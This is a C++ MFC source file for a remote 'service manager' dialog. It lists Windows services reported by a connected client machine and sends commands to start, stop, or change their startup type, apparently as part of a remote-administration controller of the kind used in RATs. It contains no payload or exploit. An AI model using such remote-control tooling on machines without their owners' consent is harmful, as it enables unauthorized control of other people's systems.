// DlgServiceManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgServiceManager.h"
#include "afxdialogex.h"


// CDlgServiceManager 对话框

IMPLEMENT_DYNAMIC(CDlgServiceManager, CDialog)

CDlgServiceManager::CDlgServiceManager(CWnd* pParent, _CIOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_SERVICE_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CDlgServiceManager::~CDlgServiceManager()
{
}

void CDlgServiceManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVICE_MANAGER_SHOW, m_CListCtrl_Dialog_Service_Manager_Show);
}


BEGIN_MESSAGE_MAP(CDlgServiceManager, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVICE_MANAGER_SHOW, &CDlgServiceManager::OnNMRClickListServiceManagerShow)
	ON_COMMAND(ID_MENU_SERVICE_MANAGER_LIST_RINGHT_REFRESH, &CDlgServiceManager::OnMenuServiceManagerListRinghtRefresh)
	ON_COMMAND(ID_MENU_SERVICE_MANAGER_LIST_RINGHT_START, &CDlgServiceManager::OnMenuServiceManagerListRinghtStart)
	ON_COMMAND(ID_MENU_SERVICE_MANAGER_LIST_RINGHT_STOP, &CDlgServiceManager::OnMenuServiceManagerListRinghtStop)
	ON_COMMAND(ID_MENU_SERVICE_MANAGER_LIST_RINGHT_AUTO_RUN, &CDlgServiceManager::OnMenuServiceManagerListRinghtAutoRun)
	ON_COMMAND(ID_MENU_SERVICE_MANAGER_LIST_RINGHT_DEMAND_RUN, &CDlgServiceManager::OnMenuServiceManagerListRinghtDemandRun)
END_MESSAGE_MAP()


// CDlgServiceManager 消息处理程序


void CDlgServiceManager::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		m_ContextObject->DialogHandle = NULL;
		m_ContextObject->DialogID = 0;
	}
	CDialog::OnClose();
}


BOOL CDlgServiceManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_IconHwnd, FALSE);
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\\\\%s - 服务管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);

	m_CListCtrl_Dialog_Service_Manager_Show.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CListCtrl_Dialog_Service_Manager_Show.InsertColumn(0, "真实名称", LVCFMT_LEFT, 150);
	m_CListCtrl_Dialog_Service_Manager_Show.InsertColumn(1, "显示名称", LVCFMT_LEFT, 260);
	m_CListCtrl_Dialog_Service_Manager_Show.InsertColumn(2, "启动类型", LVCFMT_LEFT, 80);
	m_CListCtrl_Dialog_Service_Manager_Show.InsertColumn(3, "运行状态", LVCFMT_LEFT, 80);
	m_CListCtrl_Dialog_Service_Manager_Show.InsertColumn(4, "可执行文件路径", LVCFMT_LEFT, 380);

	ShowClientServiceList();


	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}



void CDlgServiceManager::WindowHandleIO()
{
	if (m_ContextObject == NULL)
	{
		return;
	}

	switch (m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0)[0])
	{
	case CLIENT_SERVICE_MANAGER_LIST_REPLY:
	{
		ShowClientServiceList();
		break;
	}
	default:
		//传输发生异常数据
		break;
	}
}

int CDlgServiceManager::ShowClientServiceList()
{
	char* BufferData = (char*)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));
	char* DisplayName;
	char* ServiceName;
	char* RunWay;
	char* AutoRun;
	char* FileFullPath;
	DWORD Offset = 0;
	m_CListCtrl_Dialog_Service_Manager_Show.DeleteAllItems();
	
	int i = 0;
	for ( i = 0; Offset < m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength()-1; i++)
	{
		DisplayName = BufferData + Offset;
		ServiceName = DisplayName + lstrlen(DisplayName) + 1;
		FileFullPath= ServiceName + lstrlen(ServiceName) + 1;
		RunWay = FileFullPath + lstrlen(FileFullPath) + 1;
		AutoRun = RunWay + lstrlen(RunWay) + 1;
		
		m_CListCtrl_Dialog_Service_Manager_Show.InsertItem(i, ServiceName);
		m_CListCtrl_Dialog_Service_Manager_Show.SetItemText(i, 1, DisplayName);
		m_CListCtrl_Dialog_Service_Manager_Show.SetItemText(i, 2, RunWay);
		m_CListCtrl_Dialog_Service_Manager_Show.SetItemText(i, 3, AutoRun);
		m_CListCtrl_Dialog_Service_Manager_Show.SetItemText(i, 4, FileFullPath);

		Offset += lstrlen(DisplayName) + lstrlen(ServiceName) + lstrlen(FileFullPath)
			+ lstrlen(AutoRun) + lstrlen(RunWay) + 5;
	}
	CString v1;
	v1.Format("服务个数：%d", i);
	LVCOLUMN v3;
	v3.mask = LVCF_TEXT;
	v3.pszText = v1.GetBuffer(0);
	v3.cchTextMax = v1.GetLength();
	m_CListCtrl_Dialog_Service_Manager_Show.SetColumn(4,&v3);
	return 0;
}

void CDlgServiceManager::OnNMRClickListServiceManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu Menu;
	Menu.LoadMenu(ID_MENU_SERVICE_MANAGER_LIST_RINGHT);
	CMenu* SubMenu = Menu.GetSubMenu(0);
	//获得鼠标位置
	CPoint Point;
	GetCursorPos(&Point);
	SetForegroundWindow();
	SubMenu->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON, Point.x, Point.y, this, NULL);


	*pResult = 0;
}


void CDlgServiceManager::OnMenuServiceManagerListRinghtRefresh()
{
	// TODO: 在此添加命令处理程序代码
	BYTE IsToken = CLIENT_SERVICE_MANAGER;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, 1);
}


void CDlgServiceManager::OnMenuServiceManagerListRinghtStart()
{
	// TODO: 在此添加命令处理程序代码
	ConfigClientService(1);
}


void CDlgServiceManager::OnMenuServiceManagerListRinghtStop()
{
	// TODO: 在此添加命令处理程序代码
	ConfigClientService(2);
}

void CDlgServiceManager::OnMenuServiceManagerListRinghtAutoRun()
{
	// TODO: 在此添加命令处理程序代码
	ConfigClientService(3);
}


void CDlgServiceManager::OnMenuServiceManagerListRinghtDemandRun()
{
	// TODO: 在此添加命令处理程序代码
	ConfigClientService(4);
}

void CDlgServiceManager::ConfigClientService(BYTE IsMethod)
{
	DWORD Offset = 2;
	POSITION Position = m_CListCtrl_Dialog_Service_Manager_Show.GetFirstSelectedItemPosition();
	int Item = m_CListCtrl_Dialog_Service_Manager_Show.GetNextSelectedItem(Position);
	CString v1 = m_CListCtrl_Dialog_Service_Manager_Show.GetItemText(Item, 0);

	char* ServiceName = v1.GetBuffer(0);

	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 3 + lstrlen(ServiceName));
	BufferData[0] = CLIENT_SERVICE_MANAGER_CONFIG;
	BufferData[1] = IsMethod;
	memcpy(BufferData + Offset, ServiceName, lstrlen(ServiceName) + 1);
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

